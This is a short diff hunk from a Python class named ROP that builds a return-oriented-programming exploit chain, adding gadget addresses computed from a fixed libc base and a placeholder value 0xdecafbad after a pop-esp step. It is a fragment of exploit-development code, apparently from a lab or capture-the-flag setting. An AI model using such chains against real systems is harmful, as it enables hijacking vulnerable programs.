@@ -333,6 +333,7 @@ class ROP:
         #sys.stdout.buffer.write((0x00098ffc + 0xb7dec000).to_bytes(4, byteorder='little'))  # 0x00098ffc : add dword ptr [eax], esp ; ret
         self.arr += (0x00098ffc + 0xb7dec000).to_bytes(4, byteorder='little')
         self.pop_register("esp")
+        self.arr += (0xdecafbad).to_bytes(4, byteorder='little')
         self.count += 4
 
         '''
